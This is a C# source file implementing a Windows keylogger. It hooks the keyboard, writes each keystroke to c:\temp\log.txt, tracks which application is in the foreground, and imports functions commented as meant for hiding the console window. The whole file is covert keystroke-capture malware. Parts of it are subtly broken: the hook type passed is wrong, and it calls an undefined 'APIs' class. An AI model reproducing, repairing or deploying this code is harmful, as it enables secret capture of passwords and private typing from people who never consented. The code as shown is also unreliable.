using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace nvvsv
{
    public class HK
    {
        StringBuilder txt_Log = new StringBuilder();

        private Stack<string> _appNames = new Stack<string>();
        private Dictionary<string, string> _logData = new Dictionary<string, string>();

        public HK()
        {
            l2();
            //Logger("start");
        }

        private void Logger(string txt)
        {

            txt_Log.AppendLine(txt);


            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    _logData.Add(_thisapplication, "");
                }
                var en = _logData.GetEnumerator();
                while (en.MoveNext())
                {
                    var pair = en.Current;
                    if (pair.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = pair.Value.ToString();
                        _logData.Remove(_thisapplication);
                        _logData.Add(_thisapplication, prlogdata + " " + txt);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        #region Methods
        
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(@"c:\temp\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WM_KEYDOWN, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        #endregion

        #region DLL
        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        #endregion


        private void l2()
        {
            var handle = GetConsoleWindow();
            _hookID = SetHook(_proc);
            Application.Run();
 
        }

    }

}
